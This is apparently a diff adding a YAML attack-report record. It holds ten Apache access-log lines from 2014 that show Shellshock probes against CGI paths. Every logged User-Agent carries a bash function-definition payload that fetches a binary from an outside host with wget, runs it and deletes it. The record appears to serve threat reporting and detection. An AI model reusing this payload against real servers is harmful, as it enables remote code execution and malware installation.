@@ -1,0 +1,39 @@
+---
+proof:
+  contents:
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/php.fcgi HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/test.sh HTTP/1.0" 404
+    162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/proxy.cgi HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/uptime.cgi HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/index.cgi HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/print.sh HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/login.cgi HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-sys/guestbook.cgi HTTP/1.0"
+    404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-sys/defaultwebpage.cgi
+    HTTP/1.0" 404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/info.sh HTTP/1.0" 404
+    162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+    +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+  from:
+    hostname: xieshaij
+  type: apache2_access_log
+categories:
+- exploit_finder.shellshock
+- attacks.80
